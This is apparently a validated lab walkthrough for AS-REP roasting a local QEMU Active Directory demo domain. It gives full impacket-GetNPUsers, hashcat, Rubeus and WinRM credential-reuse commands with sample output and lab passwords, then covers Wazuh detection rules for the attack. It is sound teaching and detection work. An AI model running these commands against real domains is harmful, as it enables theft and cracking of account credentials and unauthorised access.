# ASREP demo DC — validated walkthrough

End-to-end AS-REP roasting against the local QEMU build. Commands assume `nix develop .#kali` unless noted.

**Goal:** obtain a crackable `$krb5asrep$` hash for `enite`, recover `stud87`, and observe Wazuh rule `100700`.

| Role | Address |
|---|---|
| DC (Kerberos) | `10.0.3.15` (QEMU user-net guest; `127.0.0.1:18088` host forward) |
| DC (WinRM) | `127.0.0.1:15986` |
| Attacker gateway | `10.0.3.2` from guest perspective (docker Wazuh manager) |

---

## Goal checklist

| Phase | Command | Evidence |
|---|---|---|
| 0 Tooling | `./scripts/check-asrep-tooling.sh --kali` | all PASS |
| 1 Build | `./scripts/build-asrep-local.sh` | `result/asrep.qcow2` |
| 1 Boot | `./scripts/run-local-asrep.sh` | Kerberos forward `:18088` |
| 1 Config smoke | `./scripts/verify-asrep.sh 127.0.0.1` | enite pre-auth + flag |
| 4–5 Roast | `nix develop .#kali -c ./scripts/validate-asrep.sh` | `$krb5asrep$` + hashcat |
| 8 SIEM | `./scripts/validate-asrep-siem.sh` | `siem-summary.json` rule `100700` |
| Loop | `./scripts/observability-loop-asrep.sh` | `artifacts/asrep/observability-loop/*/summary.csv` |
| Stress | `./scripts/observability/stress-campaign-asrep.sh` | `campaign-summary.csv` |
| Proxmox | `./scripts/proxmox/deploy-asrep.sh` | `verify-asrep` on VMID 112 |

---

## Phase 0 — Tooling

```bash
./scripts/check-asrep-tooling.sh --kali
nix develop .#kali
command -v GetNPUsers.py hashcat
```

---

## Phase 1 — Build and boot

```bash
export SECRETCON_ASREP_FLAG='flag{asrep-local-test}'
export AD_SAFEMODE_PASSWORD='PizzaMan123!'
./scripts/build-asrep-local.sh
./scripts/run-local-asrep.sh
```

Wait ~2 minutes after first boot for the startup scheduled task to promote the forest and seed `enite`.

Verify promotion (optional, from `nix develop`):

```bash
WINRM_PORT=15986 python3 - <<'PY'
import winrm
s = winrm.Session("http://127.0.0.1:15986/wsman", auth=("Administrator", "PizzaMan123!"), transport="ntlm")
r = s.run_ps("Get-ADDomain | Select-Object DNSRoot; Get-ADUser enite -Properties DoesNotRequirePreAuth | Select-Object SamAccountName,DoesNotRequirePreAuth")
print(r.std_out.decode())
PY
```

Example output:

```
DNSRoot
---------
secretcon.local

SamAccountName DoesNotRequirePreAuth
-------------- ----------------------
enite          True
```

---

## Phase 2 — Reconnaissance

From the attacker host, `./scripts/validate-asrep.sh` auto-detects the QEMU Kerberos forward on `127.0.0.1:18088` when the guest slirp IP is not routed (common when `br-chain8` owns `10.0.2.0/24`):

```bash
nc -zv 127.0.0.1 18088
nmap -sV -p 18088,15986 127.0.0.1
```

Example:

```
88/tcp   open  kerberos-sec
389/tcp  open  ldap
445/tcp  open  microsoft-ds
```

---

## Phase 3 — User enumeration

Create a candidate user list (decoys plus the roast target):

```bash
cat > /tmp/users.txt <<EOF
enite
jdoe
asmith
bwilson
clee
dpark
administrator
EOF
```

No LDAP creds required for AS-REP; the roast reveals which accounts have pre-auth disabled.

---

## Phase 4 — AS-REP roast

```bash
impacket-GetNPUsers secretcon.local/ \
  -usersfile /tmp/users.txt \
  -no-pass \
  -dc-ip 127.0.0.1 \
  -format hashcat \
  -outputfile /tmp/asrep.hashes
```

Example output:

```
$krb5asrep$23$enite@SECRETCON.LOCAL:...
Impacket v0.12.0 - ...
```

Only `enite` should return a hash; decoy users produce no output.

---

## Phase 5 — Offline crack

```bash
hashcat -m 18200 -a 0 /tmp/asrep.hashes /usr/share/wordlists/rockyou.txt
hashcat -m 18200 --show /tmp/asrep.hashes
```

Example:

```
$krb5asrep$23$enite@SECRETCON.LOCAL:...:stud87
```

---

## Phase 6 — Credential reuse (optional)

```bash
nxc winrm 127.0.0.1 -p 15986 -d secretcon.local -u enite -p stud87
```

Or WinRM from Python:

```bash
python3 - <<'PY'
import winrm
s = winrm.Session("http://127.0.0.1:15986/wsman", auth=("secretcon.local\\enite", "stud87"), transport="ntlm")
print(s.run_ps("whoami; type C:\\Users\\Public\\enite-flag.txt").std_out.decode())
PY
```

---

## Phase 7 — Rubeus (optional, from Windows foothold)

If you already have a shell on a domain-joined workstation:

```powershell
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
```

Same `$krb5asrep$` line shape as impacket; feed `hashes.txt` to hashcat `-m 18200`.

---

## Phase 8 — Defender narrative (Wazuh)

After `./scripts/wazuh-docker-up.sh` and an agent enrolled in group `asrep`, run the roast again and search the dashboard for rule **`100700`**.

| Field | Expected value |
|---|---|
| `win.system.eventID` | `4768` |
| `win.eventdata.preAuthType` | `0` |
| `win.eventdata.targetUserName` | `enite@SECRETCON.LOCAL` |
| `win.eventdata.ticketEncryptionType` | `0x17` (RC4-HMAC) |

Rule reference:

- **`100700`** — AS-REP roast targeting `enite` (level 9)
- **`100701`** — subsequent TGS-REQ for `enite` with RC4
- **`100702`** — interactive logon as `enite` after crack

This is the demo "defender sees it" beat: show the 4768 line in Wazuh alongside the recovered `stud87` on the attacker side.

---

## Phase 9 — Automated validation

```bash
./scripts/verify-asrep.sh 127.0.0.1
nix develop .#kali -c ./scripts/validate-asrep.sh
./scripts/validate-asrep-siem.sh
```

Example summary:

```
===== validate-asrep =====
  4 pass / 0 fail
=========================
```

---

## Phase 10 — Observability loop and stress campaign

```bash
./scripts/wazuh-docker-up.sh
./scripts/observability-loop-asrep.sh --iterations 3
./scripts/observability/stress-campaign-asrep.sh --iterations 10
```

Artifacts land under `artifacts/asrep/observability-loop/` and `artifacts/asrep/stress-campaign/`. See [defend-faq-walkthrough.md](defend-faq-walkthrough.md) for rule fire-rate interpretation.

---

## Phase 11 — Proxmox deploy

```bash
./scripts/proxmox/deploy-asrep.sh --vmid 112
./scripts/proxmox/baseline-snapshot-asrep.sh --vmid 112 --ip <dhcp-ip>
```

See [reports/proxmox-deploy-recon.md](reports/proxmox-deploy-recon.md) for range inventory notes.

---

## Smoke status

| Step | Status | Notes |
|---|---|---|
| Packer build | pass | `./scripts/build-asrep-local.sh` — rebuild with `WAZUH_MANAGER=10.0.3.2` after gateway fix |
| verify-asrep | ready | `./scripts/verify-asrep.sh 127.0.0.1` (Administrator WinRM) |
| GetNPUsers | pass | `./scripts/validate-asrep.sh` via `127.0.0.1:18088` forward |
| hashcat crack | ready | `nix develop .#kali` includes `wordlists` + smoke wordlist fallback |
| Wazuh `100700` | ready | `./scripts/validate-asrep-siem.sh` (needs docker stack + agent) |
| Observability loop | ready | `./scripts/observability-loop-asrep.sh` |
| Stress campaign | ready | `./scripts/observability/stress-campaign-asrep.sh` |
| Proxmox deploy | ready | `./scripts/proxmox/deploy-asrep.sh` VMID 112 |
